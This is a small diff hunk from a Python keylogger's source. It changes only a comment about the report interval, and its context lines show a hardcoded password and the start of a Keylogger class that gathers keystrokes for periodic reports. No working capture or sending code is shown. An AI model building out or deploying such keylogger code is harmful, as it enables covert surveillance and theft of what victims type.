@@ -9,7 +9,7 @@ password = "ThisIsAPassword"
 
 class Keylogger:
     def __init__(self, interval):
-        # we gonna pass SEND_REPORT_EVERY to interval
+        # we gonna pass sendEvery to interval
         self.interval = interval
         # this is the string variable that contains the log of all 
         # the keystrokes within `self.interval`
